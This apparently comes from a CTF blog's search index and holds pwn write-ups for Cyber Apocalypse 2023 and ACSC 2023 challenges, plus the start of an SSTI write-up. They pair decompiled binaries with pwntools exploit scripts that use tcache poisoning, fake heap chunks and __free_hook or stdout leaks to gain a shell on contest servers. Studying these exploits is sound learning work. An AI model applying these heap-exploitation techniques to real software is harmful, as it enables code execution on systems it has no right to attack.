2023","objectID":"/posts/cyber-apocalypse-2023-pwn/:5:2","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","tcache","UDA","Buffer Overflow","ROP"],"title":"Cyber Apocalypse 2023: Pwn","uri":"/posts/cyber-apocalypse-2023-pwn/"},{"categories":null,"content":"Math Door Description Pandora is making her way through the ancient city, but she finds herself in a room with only locked doors. One of them looks majestic, and it has lots of hieroglyphs written on its surface. After inspecting it, she realizes it’s all math: the door presents a problem and she has to solve it to go through to the heart of the ancient city. Will you be able to help her? Fun fact: I was the one who took the first blood of this challenge ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-pwn/:6:0","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","tcache","UDA","Buffer Overflow","ROP"],"title":"Cyber Apocalypse 2023: Pwn","uri":"/posts/cyber-apocalypse-2023-pwn/"},{"categories":null,"content":"Initial Analysis For this challenge, we were given a binary called math-door and the used libc libc.so.6. Checking the given libc, it used libc-2.31. Now, Let’s try to checksec it. Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Okay, so all protections are enabled. Let’s try to disassemble the binary to understand how the binary works. main int __cdecl __noreturn main(int argc, const char **argv, const char **envp) { int v3; // [rsp+Ch] [rbp-4h] setup(argc, argv, envp); puts( \"You are facing the mathy door!\\n\" \"The door is blocked by a mysterious riddle that hasn't been solved since the ancient times...\\n\" \"It's said that it's beyond human comprehension. That only alien beings can understand such advanced concepts.\\n\" \"Can you math your way through?\"); while ( 1 ) { while ( 1 ) { puts(\"1. Create \\n2. Delete \\n3. Add value \\nAction: \"); v3 = read_int(); if ( v3 != 3 ) break; math(); } if ( v3 \u003e 3 ) { LABEL_10: puts(\"Invalid action!\"); } else if ( v3 == 1 ) { create(); } else { if ( v3 != 2 ) goto LABEL_10; delete(); } } } Okay, so reading through the menu, there are three actions that we can do: Create Delete Add value Let’s check the available menu one by one. create int create() { int v1; // ebx if ( counter \u003e 64 ) return puts(\"Max amount of hieroglyphs reached.\"); v1 = counter; chunks[v1] = malloc(0x18uLL); printf(\"Hieroglyph created with index %i.\\n\", (unsigned int)counter); return ++counter; } Okay, so we have global variable called counter to store the number of hieroglyphs that we can create. And there is a global variable called chunks, which is a pointer to a heap chunk with size 0x18. There isn’t any bug in here, so let’s move to the next menu delete void delete() { unsigned int v0; // [rsp+Ch] [rbp-4h] puts(\"Hieroglyph index:\"); v0 = read_int(); if ( v0 \u003c counter ) free((void *)chunks[v0]); // Doesn't nullify the ptr + Double Free else puts(\"That hieroglyph doens't exist.\"); } With this menu, we can free a chunk that we have allocated before. However, notice that there are two bugs in this function: First, after it freed the chunk, it doesn’t nullify the chunk. Second, there isn’t any check whether the chunk has been freed or not. So, we can free the same chunk multiple times (Double Free). math (add value) unsigned __int64 math() { _BYTE idx[12]; // [rsp+Ch] [rbp-24h] BYREF __int64 v2; // [rsp+18h] [rbp-18h] __int64 v3; // [rsp+20h] [rbp-10h] unsigned __int64 v4; // [rsp+28h] [rbp-8h] v4 = __readfsqword(0x28u); *(_DWORD *)\u0026idx[8] = 0; v2 = 0LL; v3 = 0LL; puts(\"Hieroglyph index:\"); *(_QWORD *)idx = (unsigned int)read_int(); if ( *(_DWORD *)idx \u003c= (unsigned int)counter ) { puts(\"Value to add to hieroglyph:\"); read(0, \u0026idx[4], 0x18uLL); *(_QWORD *)chunks[*(unsigned int *)idx] += *(_QWORD *)\u0026idx[4]; *(_QWORD *)(chunks[*(unsigned int *)idx] + 8LL) += v2; *(_QWORD *)(chunks[*(unsigned int *)idx] + 16LL) += v3; } else { puts(\"That hieroglyph doens't exist.\"); } return __readfsqword(0x28u) ^ v4; } So, this menu will ask for the chunk index that we want to modify, and then ask the value that we want to add to the chunk. Notice that there is a bug in here: Notice that there isn’t a check whether the chosen chunk has been freed or not. This means that there is a Use-After-Free (UAF) bug. To summarize, the bugs that we have: UAF, where we can modify the chunk with math function even though we have freed that chunk Double Free, where we can free the chunk multiple times because there isn’t any check whether the target chunk has been freed or not. Now that we have discovered the bugs in the binary, it’s time to think about how to exploit the bugs. The goal is to get a shell. ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-pwn/:6:1","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","tcache","UDA","Buffer Overflow","ROP"],"title":"Cyber Apocalypse 2023: Pwn","uri":"/posts/cyber-apocalypse-2023-pwn/"},{"categories":null,"content":"Solution In order to get a shell, we typically need to obtain a libc address leak first. The most common method is to free a heap chunk to the unsorted bin and then attempt to read the value of the freed chunk to get the libc address since the freed chunk will contain a libc address to the main_arena. However, there are certain limitations in this binary that we must overcome: We can only call malloc(0x18) using the create function. This is a limitation because: In order to free a heap chunk to the unsorted bin, we need to either: Free a chunk with size larger than the limit of tcache (0x408), or Fill the tcache bin with size larger than 0x80 (Max entries per bin is 7), so that the next free after the bin is full will go to unsorted bin. If the size is \u003c= 0x80, it will go to fastbin instead. We couldn’t see the value of the hieroglyph (chunk) becaue there isn’t any menu to support that action. So, even though we somehow can fill the chunk’s stored value with a libc address due to to the free to unsorted bin, we still couldn’t see the stored value. So, we need to bypass this limitation one by one. Let’s try to think on how to bypass it and get a shell with top-down approach. Thus, we must bypass these limitations one by one. Our ultimate goal is to spawn a shell. Because the used libc is libc-2.31, the __free_hook can still be used. So, our target is simple, overwrite the __free_hook with system, so that when we call free(\"/bin/sh\"), it will do system(\"/bin/sh\") instead. To overwrite the __free_hook, the idea is we need to somehow allocate a chunk to that address, so that when we modify the value, the __free_hook value will be overwritten. To do that, we can leverage the UAF bug to do tcache poisoning, so that the freelist pointer will be forged to point to the __free_hook address. If we’re able to poison it, when we allocate a chunk, the chunk will reside in the same address with __free_hook. Now, in order to do that, we need a way to print a libc address, so that we can have a leak and use that value to poison the tcache. However, as I stated before, let say that we’re able to free a chunk to unsorted bin, even though we have UAF, we couldn’t see the libc adress value on that freed chunk. What we can do is only modifying the value with UAF, not printing the value. In this case, usually one of the tricks is to get a libc leak via stdout. You can read more about this on my other writeup, but the tl;dr is we can get a libc leak if we’re able to: Overwrite _IO_2_1_stdout_-\u003eflags with 0x1800 Overwrite _IO_2_1_stdout_-\u003e_IO_write_ptr to be larger than _IO_2_1_stdout_-\u003e_IO_write_base. An idea that I have to modify the _IO_2_1_stdout_ fields is somehow, we need to somehow able to allocate a hieroglyph chunk to the _IO_2_1_stdout_ so that we can modify its value with the math function. To do that, my idea is to do tcache poisoning to forge the freelist pointer to point to the _IO_2_1_stdout_, so that when we call create (which trigger malloc(0x18)), the chunk will be allocated to the stdout struct due to the poisoned freelist. And to do that tcache poisoning, we need to somehow overwrite the tcache freelist pointer with the stdout libc address. But then again, we don’t know the libc address yet, so we can’t simply trigger the UAF to poisoned the tcache. An idea that came to my mind is we need to leverage the double free bug that we have. The main idea is, we need to free a chunk twice, so that: The first free will make the chunk went to tcache The second free will make the chunk went to unsorted bin Notes that tcache has higher priority than unsorted bin during malloc, which mean if the chunk resides in both tcache and unsorted bin, the allocation logic will consider the chunk as a tcache entry rather than an unsorted bin chunk. So, if we’re somehow able to do that, that basically the same as what we’re trying to do, poisoned a tcache freelist pointer to point to a libc area. And once it has pointed to a libc area, we can use the UAF b","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-pwn/:6:2","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","tcache","UDA","Buffer Overflow","ROP"],"title":"Cyber Apocalypse 2023: Pwn","uri":"/posts/cyber-apocalypse-2023-pwn/"},{"categories":null,"content":"Runic Description Pandora is close to finally arriving at the Pharaoh’s tomb and finding the ancient relic, but she faces a tremendously complex challenge. She stumbles upon a alien-looking piece of technology that has never been mentioned in her archives, and it seems to be blocking the entrance to the Pharaoh’s tomb. The machine has some runes inscribed on its surface, but Pandora can’t work their meaning out. The only thing she knows is that they seem to appear, change and disappear when she tries to manipulate them. She really can’t figure out the inner workings of the device, but she can’t just give up. Can you help Pandora master the runes? ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-pwn/:7:0","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","tcache","UDA","Buffer Overflow","ROP"],"title":"Cyber Apocalypse 2023: Pwn","uri":"/posts/cyber-apocalypse-2023-pwn/"},{"categories":null,"content":"Initial Analysis We were given a binary file called runic and libc.so.6. Checking the given libc.so.6, it is a libc-2.35. Let’s checksec it first. Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled So, the binary enabled all protections. Let’s start disassemble it one by one. main int __cdecl __noreturn main(int argc, const char **argv, const char **envp) { int v3; // [rsp+Ch] [rbp-4h] setup(argc, argv, envp); puts( \"This is the ultimate test!\\n\" \"Do you have what it takes to master the runes?\\n\" \"Are you worthy of laying your eyes on the Pharaoh's tomb?\\n\" \"Only your actions will tell...\"); while ( 1 ) { while ( 1 ) { puts(\"1. Create rune\\n2. Delete rune\\n3. Edit rune\\n4. Show rune\\nAction: \"); v3 = read_int(); if ( v3 != 4 ) break; show(); } if ( v3 \u003e 4 ) { LABEL_13: puts(\"Invalid action!\"); } else if ( v3 == 3 ) { edit(); } else { if ( v3 \u003e 3 ) goto LABEL_13; if ( v3 == 1 ) { create(); } else { if ( v3 != 2 ) goto LABEL_13; delete(); } } } } Okay, so from the main menu, it seems that there are 4 menu that we can use. Let’s check each function one by one. And also it called setup first before going to the while loop interactions. Let’s check all of it one by one setup int setup() { _QWORD *v0; // rax int i; // [rsp+Ch] [rbp-4h] setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); LODWORD(v0) = setvbuf(stderr, 0LL, 2, 0LL); for ( i = 0; i \u003c= 63; ++i ) { v0 = MainTable; MainTable[i] = (char *)\u0026items + 24 * i; } return (int)v0; } Okay, so there are two global variables called MainTable and items. Each MainTable[idx] entry stored the address of items[24*idx]. create unsigned __int64 create() { unsigned int v1; // [rsp+0h] [rbp-20h] unsigned int nbytes; // [rsp+4h] [rbp-1Ch] char *nbytes_4; // [rsp+8h] [rbp-18h] __int64 buf; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v5; // [rsp+18h] [rbp-8h] v5 = __readfsqword(0x28u); buf = 0LL; puts(\"Rune name: \"); read(0, \u0026buf, 8uLL); v1 = hash(\u0026buf); if ( *(_QWORD *)(*((_QWORD *)\u0026MainTable + (unsigned int)hash(\u0026buf)) + 8LL) ) { puts(\"That rune name is already in use!\"); } else { puts(\"Rune length: \"); nbytes = read_int(); if ( nbytes \u003c= 0x60 ) { nbytes_4 = (char *)malloc(nbytes + 8); strcpy(*((char **)\u0026MainTable + v1), (const char *)\u0026buf); *(_QWORD *)(*((_QWORD *)\u0026MainTable + v1) + 8LL) = nbytes_4; *(_DWORD *)(*((_QWORD *)\u0026MainTable + v1) + 16LL) = nbytes; strcpy(nbytes_4, (const char *)\u0026buf); puts(\"Rune contents: \"); read(0, nbytes_4 + 8, nbytes); } else { puts(\"Max length is 0x60!\"); } } return __readfsqword(0x28u) ^ v5; } Okay, first, let’s check the hash function because it is used in the create function. hash __int64 __fastcall hash(__int64 a1) { char v2; // [rsp+10h] [rbp-8h] int i; // [rsp+14h] [rbp-4h] v2 = 0; for ( i = 0; i \u003c= 7; ++i ) v2 += *(_BYTE *)(i + a1); return v2 \u0026 0x3F; } Ah okay, so basically, the hash function is just parsing our input byte-per-byte, add all the bytes value together, and do bitwise operator \u0026 0x3f to ensure the maximum generated hash value is 0x3f. So, reading through the create function, we can see that it is trying to implement a hashmap table, where: It will calculate the hash(rune_name) to get the hashmap index. Fetch the items[24*idx] address stored in the MainTable[idx]. Create a chunk with size equals to rune_length + 0x8. Set items[24*idx] value to rune_name. Set items[24*idx] + 0x8 value to chunk address. Set items[24*idx] + 0x10 value to rune_length. Set chunk first 8 bytes to rune_name. Set chunk+8 to rune_contents. So far, there isn’t any bug in this function. Also the max size that we can allocate is 0x60. Let’s move to the next function delete unsigned __int64 delete() { int v1; // [rsp+Ch] [rbp-14h] __int64 buf; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); buf = 0LL; puts(\"Rune name: \"); read(0, \u0026buf, 8uLL); v1 = hash((__int64)\u0026buf); if ( *(_QWORD *)(MainTable[v1] + 8LL) ) { free(*(void **)(MainTable[v1] + 8LL)); memset((void *)MainTable[v","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-pwn/:7:1","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","tcache","UDA","Buffer Overflow","ROP"],"title":"Cyber Apocalypse 2023: Pwn","uri":"/posts/cyber-apocalypse-2023-pwn/"},{"categories":null,"content":"Solution We can use the bug to trigger a heap overflow bug, by setting the size larger than the actual chunk’s size. For example, we create a rune where the rune_name_a = '\\x01\\x00', so that hash(rune_name_a) value is 1, and set its size to 0x60. Then, we create another rune where the rune_name_b = '\\x02\\x00', so that the hash(rune_name_b) value is 2, and set its size 0x10. If we use the edit menu to edit the rune_name_b to rune_name_c = '\\x01\\x00\\x02, then during fetching the new contents size, it will use the rune_a size because the hash(dest) of rune_name_c will be 1 instead of 3. Let’s try to think first on how we will use the heap overflow bug. Supposed that we already have an overflow, what should we do to get a leak of heap base? The answer is we need to have two adjacent chunks, where the first chunk is the one that we can overflow, and the second chunk is a freed chunk that contains a mangled pointer to the heap area. Let say that we have this chunks: 0x0000000000000000 0x0000000000000021 0x0000000000000000 0x0000000000000000 \u003c- chunk_a (Active) 0x0000000000000000 0x0000000000000021 0x0000000000424242 0x0000000000000000 \u003c- chunk_b (Inactive (has been freed)) And we want to leak the chunk_b. What we can do is simply overflow the chunk_a until it reach the chunk_b b data, and then with the show menu, we can call puts(chunk_a), which due to the overflow, it will also print the chunk_b value even though chunk_b is a free chunk and originally can’t be seen with the show menu. 0x0000000000000000 0x0000000000000021 0x6161616161616161 0x6161616161616161 \u003c- Overflow chunk_a (Active) 0x6161616161616161 0x6161616161616161 0x0000000000424242 0x0000000000000000 \u003c- chunk_b (Inactive (has been freed)) If we call puts(chunk_a), the content of chunk_b will be printed as well This is the basic logic that we will use during leveraging the overflow bug. Not only leaking adjacent chunk values, we can also modify adjacent chunk size metadata, or even poisoned its tcache freelist pointer (if the chunk is a tcache entry). With the overflow bug, it’s enough for us to gain a shell. My main idea to trigger the shell is: Leak a heap address Leak a libc base Gain Remote Code Execution Leak heap address Let’s start by defining helpers first: from pwn import * exe = ELF(\"runic_patched\") libc = ELF(\"./libc.so.6\") context.binary = exe context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") remote_url = \"165.232.98.11\" remote_port = 30688 gdbscript = ''' ''' def conn(): if args.LOCAL: r = process([exe.path]) if args.PLT_DEBUG: # gdb.attach(r, gdbscript=gdbscript) pause() else: r = remote(remote_url, remote_port) return r def demangle(val, is_heap_base=False): if not is_heap_base: mask = 0xfff \u003c\u003c 52 while mask: v = val \u0026 mask val ^= (v \u003e\u003e 12) mask \u003e\u003e= 12 return val return val \u003c\u003c 12 def mangle(heap_addr, val): return (heap_addr \u003e\u003e 12) ^ val r = conn() def create(name, length, contents): r.sendlineafter(b': \\n', b'1') r.sendafter(b': \\n', name) r.sendlineafter(b': \\n', str(length).encode()) if length \u003e 0: r.sendafter(b': \\n', contents) def delete(name): r.sendlineafter(b': \\n', b'2') r.sendafter(b': \\n', name) def edit(name, new_name, contents): r.sendlineafter(b': \\n', b'3') r.sendafter(b': \\n', name) r.sendafter(b': \\n', new_name) r.sendafter(b': \\n', contents) def show(name): r.sendlineafter(b': \\n', b'4') r.sendafter(b': \\n', name) r.recvuntil(b'contents:\\n') r.recvline() out = r.recvuntil(b'\\n1')[:-2] return out def key(k): return p64(k) demangle and mangle is needed because libc-2.35 have extra protection where they sort of encrypt the freelist pointer. But as long as we got the heap leak, it’s easy to get the real address. Now that we have defined our helpers, let’s kickstart our initial setup first. ''' Initial Setup ''' # The only purpose for this chunk is we need the size to be used # during the edit bug. Set the key to `\\x01` create(key(0x01), 0x60, b'a'*0x60) # Let's call this `helper_chunk","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-pwn/:7:2","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","tcache","UDA","Buffer Overflow","ROP"],"title":"Cyber Apocalypse 2023: Pwn","uri":"/posts/cyber-apocalypse-2023-pwn/"},{"categories":null,"content":" ACSC 2023 This weekend, I spent my time competing at ACSC 2023. I got the 35th place, so I won’t be qualified. The challenges are good, so I decided to create this writeup for my future notes in case I faced similar problems. Below is my writeup for some of the challenges that I managed to solve. Pwn ","date":"Feb 26, 2023","objectID":"/posts/acsc-2023/:0:0","tags":["Writeup","ACSC","pwn","hardware","ssti","sd-card","heap","libc-2.35","fsop","2023"],"title":"ACSC 2023","uri":"/posts/acsc-2023/"},{"categories":null,"content":"re (300 pts) Description Sometimes you want to rewrite notes. nc re.chal.ctf.acsc.asia 9999 nc re-2.chal.ctf.acsc.asia 7352 (Backup) ","date":"Feb 26, 2023","objectID":"/posts/acsc-2023/:1:0","tags":["Writeup","ACSC","pwn","hardware","ssti","sd-card","heap","libc-2.35","fsop","2023"],"title":"ACSC 2023","uri":"/posts/acsc-2023/"},{"categories":null,"content":"Initial Analysis We were given a binary file called chall and the libc as well. Checking the given libc, it is libc-2.35. Let’s try to disassemble the binary first. main int __cdecl main(int argc, const char **argv, const char **envp) { int v3; // eax unsigned int i; // [rsp+Ch] [rbp-4h] while ( 1 ) { do { while ( 1 ) { printf(\"\\nMENU\\n1. Edit\\n2. List\\n0. Exit\\n\u003e \"); v3 = getint(); if ( v3 != 2 ) break; for ( i = 0; i \u003c= 9; ++i ) { if ( memo_size[2 * (int)i] \u0026\u0026 memo_arr[2 * (int)i] ) { argv = (const char **)i; printf(\"[%d] %.*s\\n\", i, memo_size[2 * (int)i], memo_arr[2 * (int)i]); } } } } while ( v3 \u003e 2 ); if ( !v3 ) break; if ( v3 == 1 ) edit((__int64)\"\\nMENU\\n1. Edit\\n2. List\\n0. Exit\\n\u003e \", (__int64)argv); } puts(\"Bye.\"); return 0; } edit int __fastcall edit(__int64 a1, __int64 a2) { unsigned int v3; // [rsp+0h] [rbp-10h] unsigned int size; // [rsp+4h] [rbp-Ch] void *alloc_ptr; // [rsp+8h] [rbp-8h] printf(\"Index: \"); v3 = getint(); if ( v3 \u003e 9 ) return puts(\"Out of list\"); printf(\"Size: \"); size = getint(); if ( size \u003e 0x78 ) return puts(\"Too big memo\"); alloc_ptr = realloc(*((void **)\u0026memo_arr + 2 * v3), size); if ( (unsigned __int64)size \u003e *((_QWORD *)\u0026memo_size + 2 * v3) ) *((_QWORD *)\u0026memo_arr + 2 * v3) = alloc_ptr; *((_QWORD *)\u0026memo_size + 2 * v3) = size; printf(\"Memo: \"); getnline(*((_QWORD *)\u0026memo_arr + 2 * v3), size); return puts(\"Done\"); } Okay, so looking at the disassembly, we can get some informations related to it: Even though the disassembly gave us two array called memo_arr and memo_size, it’s actually just an array of struct, where the struct consists of: Size Pointer to the memo The max elements of the array are 10 There is only two feature, edit and list. list will iterate through the array, and then print the content only if the element size is not 0. edit will allow you to call realloc on the array elements. Max size is 0x78 So, the binary doesn’t use malloc or free, but it only use realloc to control the chunks. AFAIK, how realloc works: realloc(NULL, new_size) is equivalent to normal malloc realloc(ptr, new_size) will have different behaviors: If new_size is the same, it will return the same chunk Else: if new_size is smaller, it will free the chunk and resize it to smaller size. The remainder will be placed in free list. If new_size is bigger, it will free the current chunk and return a new bigger chunk. Now, what if the new_size is 0? Basically, it is the same as free! If you see on the edit function, it doesn’t handle properly if we try to realloc a chunk to 0. It didn’t nullify the ptr stored in the memo array. This is the bug that we will abuse. The initial analysis is finished, so now it’s time to think how to exploit this bug. ","date":"Feb 26, 2023","objectID":"/posts/acsc-2023/:1:1","tags":["Writeup","ACSC","pwn","hardware","ssti","sd-card","heap","libc-2.35","fsop","2023"],"title":"ACSC 2023","uri":"/posts/acsc-2023/"},{"categories":null,"content":"Exploitation Understanding how realloc works Because I’m not too familiar with how realloc works, I decided to play around it first. Let’s build our helper first so that we can interact with the binary easier. from pwn import * exe = ELF(\"./chall_patched\") libc = ELF(\"./libc.so.6\") ld = ELF(\"./ld-2.35.so\") context.binary = exe context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") remote_url = \"re-2.chal.ctf.acsc.asia\" remote_port = 7352 gdbscript = ''' ''' def conn(): if args.LOCAL: r = process([exe.path]) if args.PLT_DEBUG: # gdb.attach(r, gdbscript=gdbscript) pause() else: r = remote(remote_url, remote_port) return r r = conn() def edit(idx, size, memo): r.sendlineafter(b'\u003e ', b'1') r.sendlineafter(b'Index: ', str(idx).encode()) r.sendlineafter(b'Size: ', str(size).encode()) if size \u003e 1: r.sendafter(b'Memo: ', memo) def list(): r.sendlineafter(b'\u003e ', b'2') return r.recvuntil(b'\\nMENU').strip() def exit_program(): r.sendlineafter(b'\u003e ', b'0') Some behavior that I notice. during testing: Suppose that the size that we want to allocate is 0x70. If you do realloc(NULL, 0x70), if there is a free chunk in the tcache it will use it. However, if you let say do this sequence: a = NULL b = NULL a = realloc(a, 0x70) b = realloc(b, 0x70) b = realloc(b, 0) (Free) a = realloc(a, 0x10) (Resize to smaller chunk) a = realloc(a, 0x70) (Resize to bigger chunk) The last realloc didn’t want to use entry in tcache. It will create a new 0x70 chunk. If you run the below script: edit(0, 0x70, b'a') edit(1, 0x70, b'a') edit(1, 0x0, b'a') # Free edit(0, 0x10, b'a') edit(0, 0x70, b'a') Observing in the gdb, the result is like below: pwndbg\u003e bins tcachebins 0x20 [ 1]: 0x55555555a2a0 ◂— 0x0 0x60 [ 1]: 0x55555555a2c0 ◂— 0x0 0x80 [ 1]: 0x55555555a320 ◂— 0x0 fastbins 0x20: 0x0 0x30: 0x0 0x40: 0x0 0x50: 0x0 0x60: 0x0 0x70: 0x0 0x80: 0x0 unsortedbin all: 0x0 smallbins empty largebins empty pwndbg\u003e heap Allocated chunk | PREV_INUSE Addr: 0x55555555a000 Size: 0x291 Free chunk (tcachebins) | PREV_INUSE Addr: 0x55555555a290 Size: 0x21 fd: 0x55555555a Free chunk (tcachebins) | PREV_INUSE Addr: 0x55555555a2b0 Size: 0x61 fd: 0x55555555a Free chunk (tcachebins) | PREV_INUSE Addr: 0x55555555a310 Size: 0x81 fd: 0x55555555a Allocated chunk | PREV_INUSE Addr: 0x55555555a390 Size: 0x81 Top chunk | PREV_INUSE Addr: 0x55555555a410 Size: 0x20bf1 As you can see, the free chunk in the tcache is not used. This piece of information will be useful later during crafting my final exploit. Another behavior that I discovered is that: Supposed that you have ptr which is a freed chunk with size 0x70 And then you call realloc(ptr, 0x70) on that freed chunk. Because the size is the same, realloc won’t do nothing to that chunk. So it won’t allocate nor free that chunk again. Combining the bug with how realloc works Question Now that we have played around realloc for a while, time to think on our plan to exploit the bug. Given the bug that it never nullify the entry once it has entered the array, what should we do to abuse this so that we can gain code execution? Answer The answer is we need to create overlapping chunks, so that we can trigger Use-After-Free! Let’s look on the below sequence: # Create Tcache overlapping chunks edit(0, 0x70, b'a'*8) edit(1, 0x70, b'a'*8) edit(0, 0, b'a'*8) # tcache[0x80] = chunks[0] edit(1, 0, b'a'*8) # tcache[0x80] = chunks[1] -\u003e chunks[0] # This realloc will use the latest chunk in tcache[0x80]. Now, chunks[2] and chunks[1] overlap. # tcache[0x80] = chunks[0] edit(2, 0x70, b'a'*8) # chunks[2] == chunks[1] The above will make chunks[1] and chunks[2] pointing to the same address, which mean we have overlapping chunks. Below is the proof: pwndbg\u003e tele \u0026mlist 20 00:0000│ 0x56128da5d040 (mlist) ◂— 0x0 01:0008│ 0x56128da5d048 (mlist+8) —▸ 0x56128f9d42a0 ◂— 0x56128f9d4 02:0010│ 0x56128da5d050 (mlist+16) ◂— 0x0 03:0018│ 0x56128da5d058 (mlist+24) —▸ 0x56128f9d4320 ◂— 'aaaaaaaa' // chunks[1] 04:0020│ 0x56128da5d","date":"Feb 26, 2023","objectID":"/posts/acsc-2023/:1:2","tags":["Writeup","ACSC","pwn","hardware","ssti","sd-card","heap","libc-2.35","fsop","2023"],"title":"ACSC 2023","uri":"/posts/acsc-2023/"},{"categories":null,"content":"Full Script from pwn import * exe = ELF(\"./chall_patched\") libc = ELF(\"./libc.so.6\") ld = ELF(\"./ld-2.35.so\") context.binary = exe context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") remote_url = \"re-2.chal.ctf.acsc.asia\" remote_port = 7352 gdbscript = ''' ''' def conn(): if args.LOCAL: r = process([exe.path]) if args.PLT_DEBUG: # gdb.attach(r, gdbscript=gdbscript) pause() else: r = remote(remote_url, remote_port) return r r = conn() def demangle(val): mask = 0xfff \u003c\u003c 52 while mask: v = val \u0026 mask val ^= (v \u003e\u003e 12) mask \u003e\u003e= 12 return val def mangle(heap_addr, val): return (heap_addr \u003e\u003e 12) ^ val def edit(idx, size, memo): r.sendlineafter(b'\u003e ', b'1') r.sendlineafter(b'Index: ', str(idx).encode()) r.sendlineafter(b'Size: ', str(size).encode()) if size \u003e 1: r.sendafter(b'Memo: ', memo) def list(): r.sendlineafter(b'\u003e ', b'2') return r.recvuntil(b'\\nMENU').strip() def exit_program(): r.sendlineafter(b'\u003e ', b'0') # Create Tcache overlapping chunks edit(0, 0x70, b'a'*8) edit(1, 0x70, b'a'*8) edit(0, 0, b'a'*8) # tcache[0x80] = chunks[0] edit(1, 0, b'a'*8) # tcache[0x80] = chunks[1] -\u003e chunks[0] # This realloc will use the latest chunk in tcache[0x80]. Now, chunks[2] and chunks[1] overlap. # tcache[0x80] = chunks[0] edit(2, 0x70, b'a'*8) # chunks[2] == chunks[1] edit(1, 0, b'a'*8) # Free chunks[1]. Now, chunks[2] contains mangled heap pointer # Get the leak via list() feature out = list() leaked_link = u64(out.split(b'[2] ')[1][:6].ljust(8, b'\\x00')) leaked_heap = demangle(leaked_link) # Leaked heap == chunks[0] heap address log.info(f'leaked heap: {hex(leaked_heap)}') pause() # Now, our target is to create a fake chunk with size 0x420, free it, and then peek its content # # First, poison the tcache list so that the realloc will allocate a chunk to our fake chunk. # We will place the fake chunk inside the chunks[0]+0x10, so that the fake chunk metadata will be placed in chunks[0]+0x0, # which mean we can edit the fake chunk metadata later after it got allocated by calling edit on chunks[0] target_addr = leaked_heap+0x10 payload = p64(mangle(target_addr, target_addr)) # Poison tcache list. # Notes that this realloc will do nothing as chunks[1] size metadata is still the same (0x80), # which is why the tcache[0x80] won't be consumed. edit(1, 0x70, payload) edit(3, 0x70, b'a'*8) # Will used the tcache entry, which is the same address as chunk[1] edit(4, 0x70, b'a'*8) # Now, chunks[4] = chunks[0]+0x10 # Second, create an overlap chunk with chunks[4]. # We want to overlap chunks[4] and chunks[5]. # But first, fix the metadata of the fake chunk first, so that the size will be set to 0x81 payload = p64(0) + p64(0x81) edit(0, 0x70, payload) # Fix the metadata of the fake chunk by editing the chunks[0] edit(4, 0, b'a') # Now, we can free the chunks[4]. After the free, tcache[0x80] = chunks[4] # Allocate a new chunks[5], and it will use the latest chunk in tcache[0x80], which is chunks[4]. edit(5, 0x70, b'a') # Now, chunks[5] == chunks[4] # Third, forge the metadata to 0x421 payload = p64(0) + p64(0x421) edit(0, 0x70, payload) # Overwrite the metadata of the fake chunk # Now, before we free the fake chunk, we need to create two more valid fake chunks after fake_chunk+0x420 # to fulfill the security check implemented in glibc. # But we don't have yet chunk which reside on that area (fake_chunk+0x420). # # So we need to call multiple realloc on the same chunks first to grow our heap, so that one of our controlled chunk. # is placed around that area. # # Remember that if we call realloc with the same size, it will do nothing. So, to grow our heap, the trick is # we will realloc the target chunk to smaller size first, and then realloc it back again to the desired size. # # Also, remember that from our experiments, reallocing existing chunk to larger size won't use any cache # So, by doing this, we are guaranteed to grow our heap (none of our tcache chunks will be used). # # Now, Observing th","date":"Feb 26, 2023","objectID":"/posts/acsc-2023/:1:3","tags":["Writeup","ACSC","pwn","hardware","ssti","sd-card","heap","libc-2.35","fsop","2023"],"title":"ACSC 2023","uri":"/posts/acsc-2023/"},{"categories":null,"content":"easySSTI (200 pts) Description Can you SSTI me? ","date":"Feb 26, 2023","objectID":"/posts/acsc-2023/:2:0","tags":["Writeup","ACSC","pwn","hardware","ssti","sd-card","heap","libc-2.35","fsop","2023"],"title":"ACSC 2023","uri":"/posts/acsc-2023/"},{"categories":null,"content":"Initial Analysis On this challenge, we were given a WAF file called index.js and a go file called main.go as the main server. Let’s check the WAF file first const Fastify = require('fastify') const proxy = require('@fastify/http-proxy') const server = Fastify({ logger: true }) server.register(proxy, { upstream: 'http://app:3001', replyOptions: { rewriteRequestHeaders: (req, headers) =\u003e { const allowedHeaders = [ 'host', 'user-agent', 'accept', 'template' ] return Object.fromEntries(Object.entries(headers).filter(el =\u003e allowedHeaders.includes(el[0]))) }, onResponse: (request, reply, res) =\u003e { const dataChunk = [] res.on('data', chunk =\u003e { dataChunk.push(chunk) }) res.on('end', () =\u003e { const data = dataChunk.join('') if (/ACSC\\{.*\\}/.test(data)) { return reply.code(403).send(\"??\") } return reply.send(data) }) }, } }) server.listen({ host: '0.0.0.0', port: 3000 }) Reading through the code, basically, it will make a request to http://app:3001 in local, and then it will check whether the response has ACSC on it or not. If there is, it won’t return the full response of the app. Let’s continue by checking the app server code. package main import ( \"bytes\" \"fmt\" \"html/template\" \"net/http\" \"os\" \"github.com/labstack/echo/v4\" \"github.com/labstack/echo/v4/middleware\" ) func templateMiddleware(next echo.HandlerFunc) echo.HandlerFunc { return func(c echo.Context) error { file, err := os.Open(\"./template.html\") if err != nil { return err } stat, err := 